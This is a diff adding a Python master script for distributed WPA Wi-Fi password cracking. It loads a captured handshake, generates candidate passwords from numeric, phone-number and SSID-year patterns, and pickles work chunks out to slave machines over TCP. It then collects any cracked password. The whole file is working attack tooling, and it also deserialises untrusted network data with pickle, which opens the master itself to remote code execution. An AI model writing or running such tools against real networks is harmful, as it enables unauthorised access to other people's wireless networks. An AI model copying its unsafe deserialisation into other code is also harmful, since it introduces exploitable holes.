@@ -1,0 +1,134 @@
+#!/usr/bin/env python3
+import argparse
+import socket
+import threading
+import time
+import pickle
+from wpa_cracker import parse_handshake, wpa_check_mic  # Core crypto from previous script
+
+class DistributedWPACracker:
+    def __init__(self, capfile, ssid, slave_port=9999):
+        self.handshake = parse_handshake(capfile)
+        self.ssid = ssid
+        self.slave_port = slave_port
+        self.slaves = []
+        self.results = []
+        self.candidates_processed = 0
+        
+    def register_slave(self, conn, addr):
+        """Add slave to pool"""
+        print(f"[+] Slave connected: {addr}")
+        self.slaves.append((conn, addr))
+        
+    def generate_work_chunk(self, chunk_id, chunk_size=1000000):
+        """Generate chunk of candidates (customize patterns here)"""
+        chunk = []
+        base = chunk_id * chunk_size
+        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
+        
+        # Pattern 1: Sequential brute-force
+        for i in range(chunk_size):
+            num = base + i
+            cand1 = f"{num:08d}"
+            cand2 = f"pass{num:06d}"
+            cand3 = f"{chr(65 + (num % 26))}{num:06d}"
+            chunk.extend([cand1, cand2, cand3])
+            
+        # Pattern 2: Phone numbers, years, etc.
+        for i in range(1000):
+            phone = f"1{(base + i):09d}"
+            chunk.append(phone)
+            chunk.append(f"{self.ssid.lower()}{2020 + i % 10}")
+            
+        return chunk[:chunk_size]
+    
+    def worker_thread(self):
+        """Main work distributor"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind(('0.0.0.0', self.slave_port))
+        sock.listen(10)
+        print(f"[*] Master listening on port {self.slave_port}")
+        
+        chunk_id = 0
+        while True:
+            conn, addr = sock.accept()
+            client_thread = threading.Thread(target=self.register_slave, args=(conn, addr))
+            client_thread.daemon = True
+            client_thread.start()
+            
+            # Send work continuously
+            while True:
+                try:
+                    chunk = self.generate_work_chunk(chunk_id)
+                    if not chunk:
+                        break
+                        
+                    data = pickle.dumps({
+                        'handshake': self.handshake,
+                        'ssid': self.ssid,
+                        'candidates': chunk,
+                        'chunk_id': chunk_id
+                    })
+                    conn.sendall(len(data).to_bytes(4, 'big') + data)
+                    chunk_id += 1
+                    self.candidates_processed += len(chunk)
+                    
+                except:
+                    break
+        
+        sock.close()
+    
+    def result_listener(self, result_port=10000):
+        """Listen for results from slaves"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind(('0.0.0.0', result_port))
+        sock.listen(50)
+        print(f"[*] Results listener on port {result_port}")
+        
+        while True:
+            conn, addr = sock.accept()
+            data = b''
+            while True:
+                chunk = conn.recv(4096)
+                if not chunk:
+                    break
+                data += chunk
+            
+            try:
+                result = pickle.loads(data)
+                if result['success']:
+                    print(f"\n🎉 CRACKED by {addr}: {result['password']}")
+                    self.results.append(result['password'])
+                    return  # Found it!
+                else:
+                    print(f"[*] Slave {addr}: {result['checked']:,} candidates")
+            except:
+                pass
+            conn.close()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('capfile')
+    parser.add_argument('-s', '--ssid', required=True)
+    parser.add_argument('-p', '--port', type=int, default=9999)
+    args = parser.parse_args()
+    
+    cracker = DistributedWPACracker(args.capfile, args.ssid, args.port)
+    
+    # Start result listener & work distributor
+    result_thread = threading.Thread(target=cracker.result_listener)
+    work_thread = threading.Thread(target=cracker.worker_thread)
+    
+    result_thread.start()
+    work_thread.start()
+    
+    try:
+        while True:
+            time.sleep(1)
+            print(f"\r[*] Slaves: {len(cracker.slaves)} | Processed: {cracker.candidates_processed:,}", end='')
+    except KeyboardInterrupt:
+        print("\n[*] Shutting down...")
+
+if __name__ == "__main__":
+    main()
